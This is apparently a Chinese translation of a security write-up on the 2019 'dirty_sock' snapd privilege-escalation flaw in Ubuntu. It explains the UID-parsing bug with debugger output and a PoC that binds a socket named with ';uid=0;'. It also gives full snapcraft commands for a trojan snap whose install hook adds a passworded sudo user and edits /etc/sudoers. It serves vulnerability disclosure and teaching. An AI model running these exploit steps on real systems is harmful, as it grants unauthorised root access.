**2019年1月，由于默认安装的服务snapd API中的一个bug，通过默认安装的Ubuntu
Linux被发现存在特权提升漏洞，任何本地用户都可以利用此漏洞直接获取root权限。**

## 概述

首先在此提供[dirty_sock代码仓库](https://github.com/initstring/dirty_sock/)中两个有效的exploit：

>
> [dirty_sockv1](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv1.py)：基于Ubuntu
> SSO的详细信息，使用create-user API创建本地用户。
>
>
> [dirty_sockv2](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py)：侧加载snap，其中包含生成新本地用户的install
> hook。

两者都对默认安装的Ubuntu有效。大部分测试是在18.10版本完成的，不过旧版本也受改漏洞影响。值得一提的是，snapd团队对此漏洞[回应迅速且处理妥善](https://bugs.launchpad.net/snapd/+bug/1813365)。直接与他们合作也是非常愉快。

snapd提供了附加到本地UNIX_AF socket的REST
API，通过查询与该socket连接的关联UID来实现对API的访问控制。在for循环进行字符串解析的过程中，用户可控的socket数据可以覆盖UID变量，从而允许任何用户访问任何API函数。而通过访问API，有多种方法可以获取root权限，上面链接的exploit就展示了两种可能性。

## 背景：什么是snap？

为了简化Linux系统上的打包应用程序，各种新的竞争标准纷纷出现。作为其中的一个发行版，Ubuntu
Linux的开发商Canonical也在推广他们的“Snap”，类似于Windows应用程序，snap将所有应用程序依赖项转换为单个二进制文件。

Snap生态包含一个“[应用商店](https://snapcraft.io/store)”，开发人员可以在其中发布和维护即时可用的软件包。

本地的snap和在线商店的通信部分由系统服务“[snapd](https://github.com/snapcore/snapd)”处理。此服务自动安装在Ubuntu中，并在“root”用户的上下文中运行。Snapd正在发展成为Ubuntu操作系统的重要组成部分，特别是在用于云和物联网的“Snappy
Ubuntu Core”等更精简的发行版中。

## 漏洞总览

### 有趣的Linux操作系统信息

snapd服务在位于/lib/systemd/system/snapd.service的unit文件中被描述。

以下是前几行：

    
    
    [Unit]
    Description=Snappy daemon
    Requires=snapd.socket

顺着这个我们找到systemd socket unit文件，位于/lib/systemd/system/snapd.socket，其中提供了一些有趣的信息：

    
    
    [Socket]
    ListenStream=/run/snapd.socket
    ListenStream=/run/snapd-snap.socket
    SocketMode=0666

Linux通过称为“AF_UNIX”的socket在同一台机器上的进程之间进行通信。“AF_INET”和“AF_INET6”socket则用于通过网络连接的进程通信。上面显示的内容告诉我们系统创建了两个socket文件。'0666'模式则为所有人设置文件读写权限，只有这样才可以允许任何进程连接并进行socket通信。

我们可以通过文件系统在查看这些socket文件：

    
    
    $ ls -aslh /run/snapd*
    0 srw-rw-rw- 1 root root  0 Jan 25 03:42 /run/snapd-snap.socket
    0 srw-rw-rw- 1 root root  0 Jan 25 03:42 /run/snapd.socket

我们可以通过Linux中的nc工具（只要是BSD风格）连接到像这样的AF_UNIX socket。以下是一个示例。

    
    
    $ nc -U /run/snapd.socket
    HTTP/1.1 400 Bad Request
    Content-Type: text/plain; charset=utf-8
    Connection: close
    400 Bad Request

碰巧，攻击者在入侵计算机后要做的第一件事就是查找在root上下文中运行的隐藏服务，HTTP服务器是利用的主要目标，而它们通常与网络套接字有关。

现在我们知道有一个很好的利用目标 -一个隐藏可能没有被广泛测试的HTTP服务。另外，我正在开发一个提权工具[uptux](https://github.com/initstring/uptux)，该工具可识别出此漏洞。

## 存在漏洞的代码

作为一个开源项目，我们利用源代码继续进行静态分析。开发人员提供了[有关此REST
API的文档](https://github.com/snapcore/snapd/wiki/REST-API)。

对于利用而言，一个非常需要的API函数是“POST/v2/create-user”，简称为“创建本地用户”。文档告诉我们这个调用需要root权限才能执行。那么守护进程究竟是如何确定访问API的用户是否已经拥有root权限？

顺着代码我们找到了[这个文件](https://github.com/snapcore/snapd/blob/4533d900f6f02c9a04a59e49e913f04a485ae104/daemon/ucrednet.go)，现在来看这一行：

    
    
    ucred, err := getUcred(int(f.Fd()), sys.SOL_SOCKET, sys.SO_PEERCRED)

这是调用golang的标准库之一，用来收集与套接字连接相关的用户信息。基本上，AF_UNIX
socket系列有一个选项，可以在附加数据中接收发送过程的凭据（请参阅Linux命令行中的man
unix）。这是确定访问API的进程权限的一种相当可靠的方法。

通过使用名为delve的golang调试器，我们可以确切地看到上文执行“nc”命令时返回的内容。下面是在此函数中设置断点时调试器的输出，然后使用delve的“print”命令来显示变量“ucred”当前包含的内容：

    
    
    > github.com/snapcore/snapd/daemon.(*ucrednetListener).Accept()
    ...
       109:	ucred, err := getUcred(int(f.Fd()), sys.SOL_SOCKET, sys.SO_PEERCRED)
    => 110:	if err != nil {
    ...
    (dlv) print ucred
    *syscall.Ucred {Pid: 5388, Uid: 1000, Gid: 1000}

不错。它知道了我的uid为1000，即将拒绝我访问敏感的API函数。如果程序在这种状态下调用这些变量，那么结果就符合预期了，然而事实并非如此。

其实在此函数中还包含一些额外的处理，其中连接信息与上面发现的值会一起被添加到一个新对象：

    
    
    func (wc *ucrednetConn) RemoteAddr() net.Addr {
    return &ucrednetAddr{wc.Conn.RemoteAddr(), wc.pid, wc.uid, wc.socket}
    }

这些值被拼接成一个字符串变量：

    
    
    func (wa *ucrednetAddr) String() string {
        return fmt.Sprintf("pid=%s;uid=%s;socket=%s;%s", wa.pid, wa.uid, wa.socket, wa.Addr)
    }

最后经由函数解析，字符串再次被分解为单个变量

    
    
    func ucrednetGet(remoteAddr string) (pid uint32, uid uint32, socket string, err error) {
    ...
    for _, token := range strings.Split(remoteAddr, ";") {
    var v uint64
    ...
    } else if strings.HasPrefix(token, "uid=") {
    if v, err = strconv.ParseUint(token[4:], 10, 32); err == nil {
    uid = uint32(v)
    } else {
    break
    }

最后一个函数的作用是将字符串用“;”字符拆分，然后查找以“uid =”开头的任何内容。当它遍历完所有拆分时，第二次出现的“uid =”会覆盖掉第一个。

所以如果我们能以某种方式将任意文本注入此函数中...

回到delve调试器，我们可以查看一下“remoteAddr”字符串，看看在实现正确的HTTP GET请求的“nc”连接中它包含了什么：

请求：

    
    
    $ nc -U /run/snapd.socket
    GET / HTTP/1.1
    Host: 127.0.0.1

调试器输出：

    
    
    github.com/snapcore/snapd/daemon.ucrednetGet()
    ...
    =>  41:	for _, token := range strings.Split(remoteAddr, ";") {
    ...
    (dlv) print remoteAddr
    "pid=5127;uid=1000;socket=/run/snapd.socket;@"

现在的情况是，我们有一个字符串变量，其中所有变量都拼接在一起，该字符串包含四个元素。第二个元素“uid = 1000”是当前控制权限的内容。

函数将此字符串通过“;”拆分并迭代，如果字符串包含“uid=”)，则可能会覆盖第一个“uid =”。

第一个（socket=/run/snapd.socket）是用来监听socket的本地“网络地址”：是服务所定义的绑定文件路径。我们无法修改snapd，也无法让其使用另一个socket名来运行。但是字符串末尾的“@”符号是什么？
这个是从哪里来的？变量名“remoteAddr”给了一个很好的提示。在调试器中费了些周折，我们可以看到golang标准库（net.go）返回本地网络地址和远程地址。你可以在下面的调试会话中看到输出为“laddr”和“raddr”。

    
    
    > net.(*conn).LocalAddr() /usr/lib/go-1.10/src/net/net.go:210 (PC: 0x77f65f)
    ...
    => 210:	func (c *conn) LocalAddr() Addr {
    ...
    (dlv) print c.fd
    ...
    laddr: net.Addr(*net.UnixAddr) *{
    Name: "/run/snapd.socket",
    Net: "unix",},
    raddr: net.Addr(*net.UnixAddr) *{Name: "@", Net: "unix"},}

远程地址会被设置为神秘的@符号。进一步阅读man
unix帮助信息后，我们了解到这与“抽象命名空间”有关，用来绑定独立于文件系统的socket。命名空间中的socket开头为null-byte，该字符在终端中通常会显示为@。

我们可以创建绑定到我们控制的文件名的socket，而不依赖netcat利用的抽象套接字命名空间。这应该允许我们影响想要修改的字符串变量的最后部分，也就是上文的“raddr”变量。

使用一些python代码，我们可以创建一个包含“;uid=0;”字符串的文件名，通过socket绑定该文件，来启动与snapd API的连接。

以下为PoC代码片段：

    
    
    ## 设置包含payload的socket名称
    sockfile = "/tmp/sock;uid=0;"
    ## 绑定socket
    client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    client_sock.bind(sockfile)
    ## 连接到snap守护进程
    client_sock.connect('/run/snapd.socket')

现在再看一下remoteAddr变量，观察调试器中发生的事情：

    
    
    > github.com/snapcore/snapd/daemon.ucrednetGet()
    ...
    =>  41:	for _, token := range strings.Split(remoteAddr, ";") {
    ...
    (dlv) print remoteAddr
    "pid=5275;uid=1000;socket=/run/snapd.socket;/tmp/sock;uid=0;"

我们注入了一个假的uid 0，即root用户，它会在最后一次迭代中覆盖实际的uid。这样我们就能够访问API的受保护功能。

在调试器中继续观察来验证这一点，并看到uid被设置为0：

    
    
    > github.com/snapcore/snapd/daemon.ucrednetGet()
    ...
    =>  65:	return pid, uid, socket, err
    ...
    (dlv) print uid
    0

## 武器化使用

### 版本一

[dirty_sockv1](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv1.py)利用的是“POST/v2/create-user”这个API函数。要利用该漏洞，我们只需在[Ubuntu
SSO](https://login.ubuntu.com/)上创建一个账户，然后将SSH公钥上传到账户目录中，接下来使用如下命令来利用漏洞（使用注册的邮箱和关联的SSH私钥）：

    
    
    $ dirty_sockv1.py -u 你的@邮箱.com -k id_rsa

这种方法是非常可靠的，可以安全执行。你可以止步这里并自己尝试获得root权限。

还在看？ 好吧，对互联网连接和SSH服务的要求一直在变，我想看看我是否可以在更受限制的环境中利用。这导致我们有了版本二。

### 版本二

[dirty_sockv2](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py)使用了“POST/v2/snaps”
API来侧加载snap，该snap中包含一个bash脚本，可以添加一个本地用户。这个版本适用于没有运行SSH服务的系统，也适用于没有互联网连接的新版Ubuntu。然而，侧加载需要一些核心snap依赖，如果不存在这些依赖，可能会触发snapd服务的更新操作。这个场景下，我发现这个版本仍然有效，但只能使用一次。

snap本身运行在沙箱环境中，并且数字签名需要匹配主机已信任的公钥。然而我们可以通过处于开发模式（“devmode”）的snap来降低这些限制条件，这样snap就能像其他应用那样访问主机操作系统。

此外snap引入了“hooks”机制，其中“install hook”会在snap安装时运行，并且“install
hook”可以是一个简单的shell脚本。如果snap配置为“devmode”，那么这个hook会在root上下文中运行。

我创建了一个简单的snap，该snap没有其他功能，只是会在安装阶段执行的一个bash脚本。

该脚本会运行如下命令：

    
    
    useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
    usermod -aG sudo dirty_sock
    echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers

上面加密字符串只是使用Python crypt.crypt()函数处理“dirty_sock”所创建的文本。

以下命令显示了详细创建此快照的过程，这都是在开发机器上完成的，而不是目标机器。snap创建完毕后，我们可以将其转换为base64文本，以便包含到完整的python利用代码中。

    
    
    ## 安装必要工具
    sudo apt install snapcraft -y
    ## 创建空目录
    cd /tmp
    mkdir dirty_snap
    cd dirty_snap
    ## 初始化目录作为snap项目
    snapcraft init
    ## 设置安装hook
    mkdir snap/hooks
    touch snap/hooks/install
    chmod a+x snap/hooks/install
    ## 写下我们想要以root执行的脚本
    cat > snap/hooks/install << "EOF"
    #!/bin/bash
    useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
    usermod -aG sudo dirty_sock
    echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
    EOF
    ## 配置snap yaml文件
    cat > snap/snapcraft.yaml << "EOF"
    name: dirty-sock
    version: '0.1' 
    summary: Empty snap, used for exploit
    description: |
        See https://github.com/initstring/dirty_sock
    grade: devel
    confinement: devmode
    parts:
      my-part:
        plugin: nil
    EOF
    ## 搭建snap
    snapcraft

一旦有了snap文件，我们就可以通过bash将它转换为base64，如下所示：

    
    
    $ base64 <snap-filename.snap>

base64编码的文本可以放在dirty_sock.py漏洞利用代码开头的全局变量“TROJAN_SNAP”中。

漏洞利用代码本身是用python中写的，可以执行以下操作：

> 1.创建一个文件，文件名包含";uid=0;"
>
> 2.将socket绑定到该文件
>
> 3.连接到snap API
>
> 4.删除（上次留下的）snap
>
> 5.（在install hook将运行时）安装snap
>
> 6.删除snap
>
> 7.删除临时socket文件
>
> 8.提示祝你利用成功

![dirty_sock.png](https://image.3001.net/images/20190216/1550292328_5c6795684253e.png!small)

## 预防和补救措施

打上补丁，snapd团队在披露后迅速修复了漏洞。

 ***参考来源：[shenaniganslabs](https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html)，[thehackernews](https://thehackernews.com/2019/02/snapd-linux-privilege-escalation.html?m=1)，FB小编Covfefe编译，转载请注明来自FreeBuf.COM**

